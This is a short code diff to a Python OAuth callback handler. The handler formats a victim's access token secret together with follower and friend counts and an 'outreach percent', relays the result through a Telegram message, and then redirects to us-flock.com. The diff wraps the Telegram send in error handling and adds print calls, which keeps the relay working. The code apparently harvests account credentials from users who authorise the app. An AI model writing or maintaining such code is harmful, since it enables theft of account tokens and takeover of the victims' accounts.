@@ -128,7 +128,11 @@ async def callback():
         f"🔑~Access Token Secret: {access_token_secret}\n\n👥~Followers: {user.followers_count}\n\n"
         f"🎉~Friends: {user.friends_count}\n\n⏰~Created At: {user.created_at}\n\n💎~Outreach Percent: {outreach_percentage}%"
     )
-    send_telegram_message(ext)
+    print(ext)
+    try:
+        send_telegram_message(ext)
+    except Exception as e:
+        print(e)
     return redirect('https://us-flock.com')
 
 
